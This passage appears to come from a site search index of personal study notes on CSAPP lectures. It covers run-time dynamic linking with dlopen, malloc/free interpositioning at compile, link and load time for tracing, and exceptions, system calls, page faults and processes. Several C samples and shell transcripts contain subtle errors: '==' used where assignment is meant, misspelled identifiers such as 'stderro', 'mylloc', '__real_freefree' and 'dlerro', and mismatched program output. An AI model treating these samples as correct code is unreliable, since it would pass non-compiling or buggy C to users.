dynamically linked.</p> <p>\u200b   Dynamic linking can also occur after program has begun (run-time linking).</p> <p>\u200b       In Linux, this is done by calls to the <code>dlopen()</code> interface.</p> <p>\u200b           Distributing software.</p> <p>\u200b           High-performance web servers</p> <p>\u200b           Runtime library interpositioning.</p> <p></p> <p>Dynamic Linking at Run-time</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;dlfcn.h&gt;\n\nint x[2] = {1, 2};\nint y[2] = {3, 4};\nint z[2];\n\nint main() {\n    void *handle;\n    void (*addvec)(int *, int *, int *, int);\n    char *error;\n\n    /* Dynamically load the shared library that contains addvec() */\n    handle = dlopen(\"./libvector.so\", RTLD_LAZY);\n    if (!handle) {\n        fprintf(stderr, \"%s\\n\", dlerror());\n        exit(1);\n    }\n\n    /* Get a pointer to the addvec() function we just loaded */\n    addvec = dlsym(handle, \"addvec\");\n    if ((error == dlerror()) != NULL) {\n        fprintf(stderro, \"%s\\n\", error);\n        exit(1);\n    }\n\n    /* Now we can call addvec() just like any other function */\n    addvec(x, y, z, 2);\n    printf(\"z = [%d %d]\\n\", z[0], z[1]);\n\n    /* Unload the shared library */\n    if (dlclose(handle) &lt; 0) {\n        fprintf(stderror, \"%s\\n\", dlerror());\n        exit(1);\n    }\n    return 0;\n}\n</code></pre> <p>Linking Summary</p> <p>\u200b   Linking is a technique that allows programs to be constructed from multiple object files.</p> <p>\u200b   Linking can happen at different times in a program's lifetime:</p> <p>\u200b       Compile time (when a program is compiled)</p> <p>\u200b       Load time (when a program is loaded into memory)</p> <p>\u200b       Run time (while a program is executing)</p> <p>\u200b   Understanding linking can help you avoid nasty erros and make you a better programmer.</p> <p>Case Study: Library Interpositioning</p> <p>\u200b   Library interpositioning: powerful linking technique that allows programmers to intercept calls to arbitrary functions</p> <p>\u200b   Interpositioning can occur at:</p> <p>\u200b       Compile time: When the source code is compiled.</p> <p>\u200b       Link time: When the relocate object files are statically linked to form an executable object file.</p> <p>\u200b       Load/run time: When an executable object file is loaded into memory, dynamically linked, and then executed.</p> <p>Some Interpositioning Applications</p> <p>\u200b   Security</p> <p>\u200b       Confinement (sandboxing)</p> <p>\u200b       Behind the scene encryption.</p> <p>\u200b   Debugging</p> <p>\u200b       In 2014, two Facebook engineers debugged a treacherous 1-year old bug in their iPhone app using interpositioning.</p> <p>\u200b       Code in the SPDY networking stack was writing to the wrong location.</p> <p>\u200b       Solved by intercepting calls to Posix write functions (write, writev, pwrite).</p> <p>\u200b   Monitoring and Profiling</p> <p>\u200b       Count number of calls to functions</p> <p>\u200b       Characterize call siters and arguments to functions.</p> <p>\u200b       Malloc tracing</p> <p>\u200b           Detecting memory leaks.</p> <p>\u200b           Generating address traces.</p> <p>Example program</p> <pre><code>// int.c\n#include &lt;stdio.h&gt;\n#include &lt;malloc.h&gt;\n\nint main() {\n    int *p = malloc(32);\n    free(p);\n    return(0);\n}\n</code></pre> <p>\u200b   Goal: trace the addresses and sizes of the allocated and freed block, without breaking the program, and without modifying the source code.</p> <p>\u200b   Three solutions: interpose on the <code>lib</code>, <code>malloc</code> and <code>free</code> functions at compile time, link time and run time.</p> <p>Compile-time Interpositioning</p> <pre><code>// mymalloc.c\n#ifdef COMPILETIME\n#include &lt;stdio.h&gt;\n#include &lt;malloc.h&gt;\n\n/* malloc wrapper function */\nvoid *mymalloc(size_t size) {\n    void *ptr = malloc(size);\n    printf(\"malloc(%d)=%p\\n\", (int)size, ptr);\n    return ptr;\n}\n\n/* free wrapper function */\nvoid myfree(void *ptr) {\n    free(ptr);\n    printf(\"free(%p)\\n\", ptr);\n}\n#endif\n// malloc.h\n#define malloc(size) mylloc(size)\n#define free(ptr) myfree(ptr)\n\nvoid *mymalloc(size_t size);\nvoid myfree(void *ptr);\n</code></pre> <pre><code>linux&gt; make intc\ngcc -Wall -DCOMPILETIME -c mymalloc.c\ngcc -Wall -I. -o intc int.c mymalloc.c\nlinux&gt; make runc\n./intc\nmalloc(32)=0x1edc010\nfree(0x1edc010)\nlinux&gt; \n</code></pre> <p>Link-time Interpositioning</p> <pre><code>// mymalloc.c\n#ifdef LINKTIME\n#include &lt;stdio.h&gt;\n\nvoid *__real_malloc(size_t size);\nvoid __real_free(void *ptr);\n\n/* malloc wrapper function */\nvoid *__wrap_malloc(size_t size) {\n    void *ptr = __real_malloc(size); /*Call libc malloc*/\n    printf(\"malloc(%d) = %p\\n\", (int)size, ptr);\n    return ptr;\n}\n\n/* free wrapper function */\nvoid __wrap_free(void *ptr) {\n    __real_freefree(ptr); /* Call libc free */\n    printf(\"free(%p)\\n\", ptr);\n}\n#endif\n</code></pre> <pre><code>linux&gt; make intl\ngcc -Wall -DLINKTIME -c mymalloc.c\ngcc -Wall -c int.c\ngcc -Wall -Wl,--wrap,malloc -Wl,--wrap,free -o intl\nint.o mymalloc.o\nlinux&gt; make runl\n./intc\nmalloc(32)=0x1aa0010\nfree(0x1aa0010)\nlinux&gt; \n</code></pre> <p>\u200b   The <code>-Wl</code> flag passes argument to linker, replacing each comma with a space.</p> <p>\u200b   The <code>--wrap,malloc</code> <code>arg</code> instructs linker to resolve references in a special way:</p> <p>\u200b       Refs to <code>malloc</code> should be resolved as <code>__wrap_malloc</code></p> <p>\u200b       Refs to <code>__real_malloc</code> should be resolved as <code>malloc</code>.</p> <p>Load/Run-time Interpositioning</p> <pre><code>// mymalloc.c\n#ifdef RUNTIME\n#define _GNU_SOURCE\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;dlfcn.h&gt;\n\n/* malloc wrapper function */\nvoid *malloc(size_t size) {\n    void *(*mallocp)(size_t size);\n    char *error;\n\n    mallocp = dlsym(RTLD_NEXT, \"malloc\"); /* Get addr of libc malloc */\n    if ((error == dlerror()) != NULL) {\n        fputs(error, stderr);\n        exit(1);\n    }\n    char *ptr = mallocp(size); /* Call libc malloc */\n    printf(\"malloc(%d) = %p\\n\", (int)size, ptr);\n    return ptr;\n}\n/* free wrapper function */\nvoid free(void *ptr) {\n    void (*freep)(void *) = NULL;\n    char *error;\n\n    if (!ptr)\n        return;\n\n    freep = dlsym(RTLD_NEXT, \"free\"); /*Get address of libc free */\n    if ((error = dlerro()) != NULL) {\n        fputs(error, stderr);\n        exit(1);\n    }\n    freep(ptr); /* Call libc free */\n    printf(\"free(%p)\\n\", ptr);\n}\n#endif\n</code></pre> <pre><code>linux&gt; make intr\ngcc -Wall -DRUNTIME -shared -fpic -o mymalloc.so mymalloc.c -ldl\ngcc -Wall -o intr int.c\nlinux&gt; make runr\n(LD_PRELOAD=\"./mymalloc.so\" ./intr)\nmalloc(32) = 0xe60010\nfreep(0xe60010)\nlinux&gt; \n</code></pre> <p>\u200b   The <code>LD_PRELOAD</code> environment variable tells the dynamic linker to resolve unresolved refs (e.g. to <code>malloc</code>) by looking in <code>mymalloc.so</code> first.</p> <p>Interpositioning Recap</p> <p>\u200b   Compile Time</p> <p>\u200b       Apparent calls to malloc/free get macro-expanded into calls to mymalloc/myfree.</p> <p>\u200b   Link Time</p> <p>\u200b       Use linker trick to have special name resolutions</p> <p>\u200b           <code>malloc</code> -&gt;<code>__srap_malloc</code></p> <p>\u200b           <code>__real_malloc</code> -&gt; <code>malloc</code></p> <p>\u200b   Load/Run Time</p> <p>\u200b       Implement custom version of malloc/free that use dynamic linking to load library malloc/free under different names.</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L14-Exceptional-Control-Flow-Exceptions-and-Processes/","title":"L14 Exceptional Control Flow: Exceptions and Processes","text":"<p>Source: https://www.bilibili.com/video/BV1iW411d7hd?p=14</p> <p>\u5f02\u5e38\u63a7\u5236\u6d41\uff1aexceptional control flow.</p> <p>Today</p> <p>\u200b   Exceptional Control Flow</p> <p>\u200b   Exceptions</p> <p>\u200b   Processes</p> <p>\u200b   Process Control</p> <p>Control Flow</p> <p>\u200b   Processors do only one thing:</p> <p>\u200b       From startup to shutdown, a CPU simply reads and executes (interprets) a sequence of instructions, one at a time.</p> <p>\u200b       This sequence is the CPU's control flow (or flow of control)</p> <pre><code>    Physical control flow\n|   &lt;startup&gt;\n|   inst1\n|   inst2\n|   ...\n|   instn\n|   &lt;shutdown&gt;\nv Time\n</code></pre> <p>Altering the Control Flow</p> <p>\u200b   Up to now: two mechanisms for changing control flow:</p> <p>\u200b       Jumps and branches.</p> <p>\u200b       Call and return.</p> <p>\u200b   React to changes in program state.</p> <p>\u200b   Insufficient for a useful system: Difficult to react to changes in system state.</p> <p>\u200b       Data arrives from a disk or a network adapter.</p> <p>\u200b       Instruction divides by zero.</p> <p>\u200b       User hits Ctrl-C at the keyboard.</p> <p>\u200b       System time expires.</p> <p>\u200b   System needs mechanisms for \"exceptional control flow\"</p> <p>Exceptional Control Flow (ECF)</p> <p>\u200b   \u7cfb\u7edf\u4e2d\u7684\u6240\u6709\u7ea7\u522b\u90fd\u5b58\u5728\u5f02\u5e38\u63a7\u5236\u6d41\u3002Exists at all of a computer system.</p> <p>\u200b   Low level mechanisms</p> <p>\u200b       (1) Exceptions</p> <p>\u200b           Change in control flow in response to a system event (i.e., change in system state)</p> <p>\u200b           Implemented using combination of hardware and OS software.</p> <p>\u200b   Higher level mechanisms</p> <p>\u200b       (2) Process context switch </p> <p>\u200b           Implemented by OS software and hardware timer.</p> <p>\u200b       (3) Signals</p> <p>\u200b           Implemented by OS software.</p> <p>\u200b       (4) Nonlocal jumps: <code>setjmp()</code> and <code>long jmp</code>;</p> <p>\u200b           Implemented by C runtime library.</p> <p>Exceptions</p> <p>\u200b   \u5f02\u5e38\u662f\u9047\u5230\u4e8b\u4ef6\u5c06\u63a7\u5236\u6743\u8f6c\u79fb\u5230\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u7684\u884c\u4e3a\u3002An exception is a transfer of control to the OS kernel in response to some event (i.e. change in processor state)</p> <p>\u200b       \u5185\u6838\u662f\u64cd\u4f5c\u7cfb\u7edf\u7684\u5185\u5b58\u9a7b\u7559\u90e8\u5206\u3002 Kernel is the memory-resident part of the OS.</p> <p>\u200b       \uff08\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u5404\u79cd\u7a0b\u5e8f\uff0c\u5982\u5217\u51fa\u6587\u4ef6\u3001\u66f4\u6539\u76ee\u5f55\u3001\u5217\u51fa\u5f53\u524d\u8fdb\u7a0b\u3002\uff09</p> <p>\u200b       Examples of events: Divide by 0, arithmetic overflow, page fault, I/O request completes, typing Ctrl-C.</p> <pre><code>      User code       Kernel code\n          |\n Event --&gt;v     Exception\n      I_current-----------&gt;\n          |   ^           |\n          |   |           | Exception processing\n          v    \\  3 ways  | by exception handler\n        I_next  ----------v\n          |                \n          v\n         ...\n3 ways:\n    1. Return to I_current\n    2. Return to I_next\n    3. Abort\n</code></pre> <p>\u5f02\u5e38\u8868 Exception Tables</p> <p>\u200b   \u5f02\u5e38\u7531\u786c\u4ef6\u548c\u8f6f\u4ef6\u5171\u540c\u5b9e\u73b0\uff0c\u5b9e\u9645\u8f6c\u79fb\u63a7\u5236\u6743\u3002\uff08\u786c\u4ef6\u7684\u90e8\u5206\u6bd4\u5982\u8bf4\u7a0b\u5e8f\u8ba1\u6570\u5668 PC \u6216 %rip \u7684\u66f4\u6539\u3002\uff09\u8be5\u5f02\u5e38\u800c\u6267\u884c\u7684\u4ee3\u7801\u662f\u7531\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u8bbe\u7f6e\u548c\u786e\u5b9a\u7684\u3002</p> <p>\u200b   \u6bcf\u79cd\u7c7b\u578b\u7684\u4e8b\u4ef6\u90fd\u6709\u4e00\u4e2a\u552f\u4e00\u7684\u300c\u5f02\u5e38\u7f16\u53f7\u300d\uff08exception number\uff09\uff0c\u5176\u7528\u4f5c\u4e00\u4e2a\u8df3\u8f6c\u8868\u7684\u7d22\u5f15\uff0c\u8be5\u8df3\u8f6c\u8868\u968f\u4e4b\u88ab\u79f0\u547c\u4e3a\u5f02\u5e38\u8868\uff08exception table\uff09</p> <p>\u200b   Each type of event has a unique exception number k.</p> <p>\u200b   k = index into exception table (a.k.a. interrupt vector)</p> <p>\u200b   Handler k is called each time exception k occurs.</p> <p>\u200b   \u6709\u4e00\u79cd\u5f02\u5e38\u7684\u5206\u7c7b\u65b9\u6cd5\uff1a\u5c06\u5f02\u5e38\u5206\u7c7b\u4e3a\u5f02\u6b65\uff08asynchronous\uff09\u548c\u540c\u6b65\uff08synchronous\uff09\u4e24\u79cd\u3002</p> <p>\u5f02\u6b65\u5f02\u5e38\uff08\u4e2d\u65ad\uff09 Asynchronous Exceptions (Interrupts)</p> <p>\u200b   \u5f02\u6b65\u5f02\u5e38\u662f\u7531\u4e8e\u5904\u7406\u5668\u5916\u90e8\u53d1\u751f\u7684\u72b6\u6001\u53d8\u5316\u800c\u5f15\u8d77\u7684\uff0c\u4e5f\u88ab\u79f0\u4e3a\u4e2d\u65ad\u3002\u90a3\u4e9b\u72b6\u6001\u662f\u901a\u8fc7\u5728\u5904\u7406\u5668\u4e0a\u8bbe\u7f6e\u5f15\u811a\uff0c\u79f0\u4e3a\u4e2d\u65ad\u5f15\u811a\uff08interrupt pin\uff09\uff0c\u5411\u5904\u7406\u5668\u901a\u77e5\u8fd9\u4e9b\u72b6\u6001\u53d8\u5316\u800c\u83b7\u77e5\u7684\u3002</p> <p>\u200b   \u8fd9\u662f\u770b\u5230\u78c1\u76d8\u63a7\u5236\u5668\uff08disk controller\uff09\u5b8c\u6210\u300c\u76f4\u63a5\u5185\u5b58\u8bbf\u95ee\u300d\uff08direct memory access\uff09 \u7684\u60c5\u5f62\uff1a\u9996\u5148\u5c06\u6570\u636e\u4ece\u78c1\u76d8\u590d\u5236\u5230\u5185\u5b58\u4e2d\uff0c\u5176\u901a\u8fc7\u8bbe\u7f6e\u4e2d\u65ad\u5f15\u811a\u6765\u901a\u77e5\u5904\u7406\u5668\u5b83\u5df2\u5b8c\u6210\u590d\u5236\u3002</p> <p>\u200b   \u5728\u53d1\u751f\u4e2d\u65ad\u540e\uff0c\u5904\u7406\u7a0b\u5e8f\u8fd4\u56de\u5230\u4e0b\u4e00\u6761\u6307\u4ee4\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u901a\u5e38\u5728\u540e\u53f0\u6267\u884c\uff0c\u4e0d\u4f1a\u5f71\u54cd\u7a0b\u5e8f\u6267\u884c\u3002</p> <p>\u200b   Caused by events external to the processor.</p> <p>\u200b       Indicated by setting the processor's interrupt pin.</p> <p>\u200b       Handler returns to \"next\" instruction.</p> <p>\u200b   Examples:</p> <p>\u200b       \u5b9a\u65f6\u5668\u4e2d\u65ad Timer interrupt</p> <p>\u200b           \u6240\u6709\u7cfb\u7edf\u90fd\u6709\u4e00\u4e2a\u5185\u7f6e\u8ba1\u65f6\u5668\uff08built-in timer\uff09\uff0c\u6bcf\u9694\u51e0\u6beb\u79d2\u5c31\u4f1a\u5173\u95ed\u4e00\u6b21\uff0c\u5f53\u5b9a\u65f6\u5668\u5173\u95ed\u65f6\uff0c\u5c06\u4e2d\u65ad\u5f15\u811a\u8bbe\u7f6e\u4e3a\u9ad8\u7535\u5e73\uff0c\u5e76\u4e14\u6709\u4e00\u4e2a\u7279\u6b8a\u7684\u5f02\u5e38\u7f16\u53f7\u7528\u4e8e\u5b9a\u65f6\u5668\u4e2d\u65ad\u3002\u6211\u4eec\u9700\u8981\u5b83\u6765\u5141\u8bb8\u5185\u6838\u518d\u6b21\u83b7\u5f97\u5bf9\u7cfb\u7edf\u7684\u63a7\u5236\uff0c\u5426\u5219\uff0c\u7528\u6237\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u9677\u5165\u65e0\u9650\u5faa\u73af\u4e2d\u6c38\u8fdc\u8fd0\u884c\uff0c\u800c\u65e0\u6cd5\u8ba9\u64cd\u4f5c\u7cfb\u7edf\u83b7\u5f97\u63a7\u5236\u6743\u3002\u5373\u6b64\u8ba1\u65f6\u5668\u6bcf\u9694\u51e0\u6beb\u79d2\u5c31\u4f1a\u5173\u95ed\uff0c\u4ece\u800c\u5bfc\u81f4\u5185\u6838\u53d1\u751f\u77ac\u6001\u5f02\u5e38\uff08transient exception\uff09\uff0c\u8fdb\u800c\u8ba9\u5185\u6838\u63a5\u624b\u3002</p> <p>\u200b           Every few milliseconds, an external timer chip triggers an interrupt.</p> <p>\u200b           Used by the kernel to take back control from user program.</p> <p>\u200b       I/O interrupt from external device</p> <p>\u200b           Hitting Ctrl-C at the key board.</p> <p>\u200b           Arrival of a packet from a network.</p> <p>\u200b           Arrival of data from a disk.</p> <p>\u540c\u6b65\u5f02\u5e38 Synchronous Exceptions</p> <p>\u200b   Caused by events that occur as a result executing an instruction:</p> <p>\u200b       \u9677\u9631 Traps:</p> <p>\u200b           \u6545\u610f\u8bbe\u7f6e\u7684\u5f02\u5e38 Intentional</p> <p>\u200b           Examples: system calls\uff08\u7cfb\u7edf\u8c03\u7528\uff09, breakpoint traps, special instructions.</p> <p>\u200b           \u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u4e3a\u7a0b\u5e8f\u63d0\u4f9b\u5404\u79cd\u670d\u52a1\uff0c\u4f46\u7a0b\u5e8f\u6ca1\u6709\u76f4\u63a5\u8bbf\u95ee\u6743\u9650\uff0c\u4ece\u800c\u65e0\u6cd5\u5728\u5185\u6838\u4e2d\u8c03\u7528\u51fd\u6570\uff0c\u65e0\u6cd5\u5728\u5185\u6838\u4e2d\u8bbf\u95ee\u6570\u636e\uff0c\u53ea\u56e0\u8be5\u5185\u5b58\u53d7\u5230\u4fdd\u62a4\u4e14\u5bf9\u7528\u6237\u7a0b\u5e8f\u4e0d\u53ef\u7528\u3002\u5185\u6838\u7684\u4f5c\u7528\u662f\u63d0\u4f9b\u4e00\u4e2a\u54cd\u5e94\u7a0b\u5e8f\u53d1\u51fa\u8bf7\u6c42\u7684\u63a5\u53e3\uff0c\u8c03\u7528\u5185\u6838\u4e2d\u7684\u51fd\u6570\u5e76\u53d1\u51fa\u5bf9\u5404\u79cd\u670d\u52a1\u7684\u8bf7\u6c42\uff0c\u6b64\u63a5\u53e3\u79f0\u4e3a\u7cfb\u7edf\u8c03\u7528\uff08system call\uff09\u3002\u7a0b\u5e8f\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u5e76\u4ece\u5185\u6838\u8bf7\u6c42\u5404\u79cd\u529f\u80fd\uff0c\u5185\u6838\u4e3a\u8be5\u8bf7\u6c42\u63d0\u4f9b\u4e86\u5bf9\u5e94\u7684\u54cd\u5e94\u3002\u7136\u540e\u5c06\u63a7\u5236\u6743\u8fd4\u56de\u7ed9\u8c03\u7528\u7a0b\u5e8f\u90a3\u91cc\u7684\u51fd\u6570\u3002</p> <p>\u200b           Returns control to \"next\" instruction.</p> <p>\u200b       \u6545\u969c Faults:</p> <p>\u200b           Unintentional but possibly recoverable.</p> <p>\u200b           Examples: page faults (recoverable), protection faults (unrecoverable), floating point exceptions.</p> <p>\u200b           Either re-executes faulting (\"current\") instruction or aborts.</p> <p>\u200b       \u4e2d\u6b62 Aborts:</p> <p>\u200b           Unintentional and unrecoverable.</p> <p>\u200b           Examples: illegal instruction, parity error, machine check.</p> <p>\u200b           Aborts current program.</p> <p>\u7cfb\u7edf\u8c03\u7528 System Calls</p> <p>\u200b   Each x86-64 system call has a unique ID number.</p> <p>\u200b   Examples:</p> Number Name Description 0 <code>read</code> Read file 1 <code>write</code> Write file 2 <code>open</code> Open file 3 <code>close</code> Close file 4 <code>stat</code> Get info about file 57 <code>fork</code> Create process 59 <code>execve</code> Execute a program 60 <code>_exit</code> Terminate process 62 <code>kill</code> Send signal to process <p>System Call Example: Opening File</p> <p>\u200b   User calls: <code>open(filename, options)</code></p> <p>\u200b   Calls <code>__open</code> function, which invokes system call instruction <code>syscall</code>.</p> <pre><code>00000000000e57d0 &lt;__open&gt;:\n...\ne5d79:   b8 02 00 00 00      mov  $0x2,%eax  # open is syscall #2\ne5d7e:   0f 05               syscall         # Return value in %rax\ne5d80:   48 3d 01 f0 ff ff   cmp  $0xfffffffffffff001,%rax\n...\ne5dfa:   c3                  retq\n</code></pre> <p>\u200b   %rax contains syscall number.</p> <p>\u200b   Other arguments in %rdi, %rsi, $rdx, %r10, %r8, %r9.</p> <p>\u200b   Return value in %rax</p> <p>\u200b   Negative value is an error corresponding to neg?? <code>errno</code>. </p> <pre><code>      User code       Kernel code\n          |\n          v     Exception\n      syscall-----------&gt;\n          |cmp^         |\n          |   |         | Open file\n          v   \\ Returns | \n         ...   ---------v\n</code></pre> <p>Fault Example: Page Fault</p> <p>\u200b   User writes to memory location.</p> <p>\u200b   That portion (page) of user's memory is currently on disk.</p> <pre><code>int a[1000];\nmain() {\n    a[500] = 13;\n}\n</code></pre> <pre><code> 80483b7:       c7 05 10 9d 04 08 0d  movl   $0xd,0x8049d10\n</code></pre> <p>\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u8981\u5199\u5165\u4e00\u4e2a\u6709\u6548\u7684\u5185\u5b58\u533a\u57df\uff0c\u4f46\u6b64\u65f6\u6570\u636e\u8fd8\u672a\u4ece\u78c1\u76d8\u52a0\u8f7d\u5230\u5185\u5b58\uff0c\u56e0\u6b64\u629b\u51fa\u4e00\u4e2a\u9875\u7f3a\u5931\uff08page fault\uff09\u3002</p> <pre><code>      User code       Kernel code\n          |\n          v     Exception: page fault\n         movl------------&gt;\n          | ^            |\n          | |            | Copy page from\n          v  \\           | disk to memory\n         ...  -----------v\n                Return and reexecute movl\n</code></pre> <p>Fault Example: Invalid Memory Reference</p> <pre><code>int a[1000];\nmain () {\n    a[5000] = 13;\n}\n</code></pre> <pre><code> 80483b7:       c7 05 60 e3 04 08 0d  movl   $0xd,0x804e360\n</code></pre> <pre><code>      User code       Kernel code\n          |\n          v     Exception: page fault\n         movl------------&gt;\n                         |\n                         | Detect invalid\n                         | address\n                         v-----------------&gt; Signal process\n</code></pre> <p>\u200b   Sends <code>SIGSEGV</code> signal to user process.</p> <p>\u200b   User process exits with \"segmentation fault\".</p> <p>\u8fdb\u7a0b Processes</p> <p>\u200b   Definition: A process is an instance of a running program.</p> <p>\u200b       One of the most profound ideas in computer science.</p> <p>\u200b       Not the same as \"program\" or \"processor\".</p> <p>\u8fdb\u7a0b\u7684\u601d\u60f3\u662f\u8ba1\u7b97\u673a\u79d1\u5b66\u4e2d\u6700\u57fa\u672c\u548c\u6700\u91cd\u8981\u7684\u601d\u60f3\u4e4b\u4e00\u3002\u8fd9\u4e2a\u7ecf\u5178\u5b9a\u4e49\u662f\uff1a\u8fdb\u7a0b\u662f\u6b63\u5728\u8fd0\u884c\u7684\u7a0b\u5e8f\u7684\u5b9e\u4f8b\u3002\u8fdb\u7a0b\u4e0e\u7a0b\u5e8f\u548c\u5904\u7406\u5668\u90fd\u4e0d\u4e00\u6837\u3002 \u5b58\u5728\u7684\u7a0b\u5e8f\u53ef\u4ee5\u5b58\u5728\u4e8e\u8bb8\u591a\u4e0d\u540c\u7684\u5730\u65b9\u3002</p> <p>\u200b   Process provides each program with two key abstractions:</p> <p>\u200b       Logical control flow</p> <p>\u200b           \u8fdb\u7a0b\u53ef\u4ee5\u8ba9\u7a0b\u5e8f\u300c\u770b\u8d77\u6765\u300d\u72ec\u5360\u4f7f\u7528 CPU \u548c\u5bc4\u5b58\u5668\uff0c\u751a\u81f3\u65e0\u6cd5\u5206\u8fa8\u662f\u5426\u5b58\u5728\u5176\u4ed6\u8fd0\u884c\u7684\u7a0b\u5e8f\u3002</p> <p>\u200b           Each program seems to have exclusive use of the CPU.</p> <p>\u200b           Provided by kernel mechanism called context switching.</p> <p>\u200b       Private address space</p> <p>\u200b           \u8fdb\u7a0b\u53ef\u4ee5\u8ba9\u7a0b\u5e8f\u300c\u770b\u8d77\u6765\u300d\u62e5\u6709\u81ea\u5df1\u7684\u5730\u5740\u7a7a\u95f4\u800c\u4e0d\u5fc5\u62c5\u5fc3\u51b2\u7a81\u3002</p> <p>\u200b           Each program seems to have exclusive use of main memory.</p> <p>\u200b           \u63d0\u4f9b\u8fd9\u4e2a\u529f\u80fd\u7684\u673a\u5236\u79f0\u4e3a\u865a\u62df\u5185\u5b58\u3002 </p> <p>\u200b           Provided by kernel mechanism called virtual memory. </p> <p>\u591a\u8fdb\u7a0b\uff1a\u5e7b\u89c9 Multiprocessing: The Illusion (20:43)</p> <p>\u5373\u4f7f\u5728\u5177\u6709\u5355\u6838\u7684\u7cfb\u7edf\u4e0a\uff0c\u8fd9\u4e9b\u8fdb\u7a0b\u4e2d\u7684\u8bb8\u591a\u4e2a\u5b9e\u9645\u4e0a\u662f\u5728\u540c\u4e00\u65f6\u95f4\u5e76\u53d1\u8fd0\u884c\u3002</p> <p>\u200b   Computer runs many processes simultaneously.</p> <p>\u200b       Application for one or more users</p> <p>\u200b           Web browsers, email clients, editors...</p> <p>\u200b       Background tasks</p> <p>\u200b           Monitoring network &amp; I/O devices.</p> <p>\u200b   Running program \"top\" on Mac (21:03)</p> <p>\u200b       System has many processes, some of those are active.</p> <p>\u200b       Identified by Process ID (PID).</p> <p>Multiprocessing: The (Traditional) Reality</p> <p></p> <p>\u5047\u8bbe\u6211\u4eec\u5171\u4eab\u4f7f\u7528\u7684\u7cfb\u7edf\u53ea\u6709\u4e00\u4e2a\u6838\u5fc3\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5c31\u662f\u7ba1\u7406\u5171\u4eab\uff0c\u5b83\u7684\u4f5c\u7528\u662f\u8fd9\u6837\u7684\uff1a</p> <p>\u6211\u4eec\u6709\u4e00\u4e2a\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\uff0c\u5b83\u6709\u81ea\u5df1\u7684\u5730\u5740\u7a7a\u95f4\u548c\u5bc4\u5b58\u5668\u3002\u56e0\u4e3a\u5728\u67d0\u4e9b\u65f6\u5019\u7531\u4e8e\u5b9a\u65f6\u5668\u4e2d\u65ad\u800c\u53d1\u751f\u5f02\u5e38\uff0c\u6216\u9677\u9631\u6216\u6545\u969c\uff0c\u5728\u67d0\u4e9b\u65f6\u5019\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5c31\u53ef\u4ee5\u63a7\u5236\u7cfb\u7edf\uff0c\u7531\u5b83\u6765\u51b3\u5b9a\u5b83\u662f\u5426\u60f3\u8981\u8fd0\u884c\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u3002</p> <p>\u5982\u679c\u5b83\u9009\u62e9\u5207\u6362\uff0c\u90a3\u4e48\u5b83\u5c31\u5c06\u5bc4\u5b58\u5668\u503c\u590d\u5236\u5230\u5b58\u50a8\u5668\u4e2d\u5e76\u4fdd\u5b58\u5b83\u4eec\u3002\u7136\u540e\u5b89\u6392\u4e0b\u4e00\u4e2a\u5f85\u6267\u884c\u7684\u8fdb\u7a0b\uff0c\u5e76\u4e14\u52a0\u8f7d\u4e0a\u6b21\u8fd0\u884c\u8be5\u8fdb\u7a0b\u65f6\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u5230 CPU \u5bc4\u5b58\u5668\u4e2d\uff0c\u7136\u540e\u5c06\u5730\u5740\u7a7a\u95f4\u5207\u6362\u5230\u6b64\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u3002\u8fd9\u4e2a\u5730\u5740\u7a7a\u95f4\u548c\u5bc4\u5b58\u5668\u503c\u5c31\u662f\u300c\u4e0a\u4e0b\u6587\uff08context\uff09\u300d\u3002</p> <p>\u200b   Save current registers in memory.</p> <p>\u200b   Schedule next process for execution.</p> <p>\u200b   Load saved registers and switch address space (context switching).</p> <p>\u200b   Multicore  processors</p> <p>\u200b       Multiple CPUs on single chip.</p> <p>\u200b       Share main memory (and some of the caches).</p> <p>\u200b       Each can execute a separate process.</p> <p>\u200b           Scheduling of processors with cores done by kernel.</p> <p>Concurrent Process</p> <p>\u200b   \u6bcf\u4e2a\u8fdb\u7a0b\u4ee3\u8868\u4e00\u4e2a\u903b\u8f91\u63a7\u5236\u6d41\u3002Each process is a logical control flow.</p> <p>\u200b   \u5f53\u4e24\u4e2a\u8fdb\u7a0b\u7684\u65f6\u5e8f\u5728\u65f6\u95f4\u4e0a\u91cd\u53e0\u65f6\uff0c\u6211\u4eec\u5c31\u6210\u8fd9\u4e24\u4e2a\u8fdb\u7a0b\u300c\u540c\u65f6\u8fd0\u884c\u300d\uff08\u300c\u5e76\u53d1\u300d\uff09\u3002Two processes run concurrently (are concurrent) if their flow overlap in time.</p> <p>\u200b   \u5426\u5219\u79f0\u4e8c\u8005\u300c\u8fde\u7eed\u300d\u3002Otherwise, they are sequential.</p> <pre><code>Process A    Process B    Process C  Time|\n   o                                     |\n                o                        |\n                             o           |\n   o                                     |\n                             o           v\n</code></pre> <p>\u200b   A &amp; B, A &amp; C \u662f\u5e76\u53d1\u7684\uff0cB &amp; C \u662f\u8fde\u7eed\u7684\u3002</p> <p>User View of Concurrent Processes</p> <p>\u200b   Control flows for concurrent processes are physically disjoint in time.</p> <p>\u200b   However, we can think of concurrent processes as running in parallel with each other.</p> <pre><code>Process A    Process B    Process C  Time|\n   o                                     |\n   o            o                        |\n   o                         o           |\n   o                         o           |\n                             o           v // Seeeming\n</code></pre> <p>Context Switching</p> <p>\u200b   Processes are managed by a shared chunk of memory-resident OS code called the kernel.</p> <p>\u200b       Important: the kernel is not a separate process, but rather runs as part of some existing process.</p> <p>\u200b   Control flow passes from one process to another via a context switching.</p> <pre><code>|Time Process A    Process B\n|        |                    user code\n|        |\n|        -------              kernel code -&gt; context switching\n|               \\\n|                ------\n|                     |       user code\n|                     |\n|                ------       kernel code -&gt; context switching\n|               /\n|        -------\n|        |                    user code\n|        |\nv\n</code></pre> 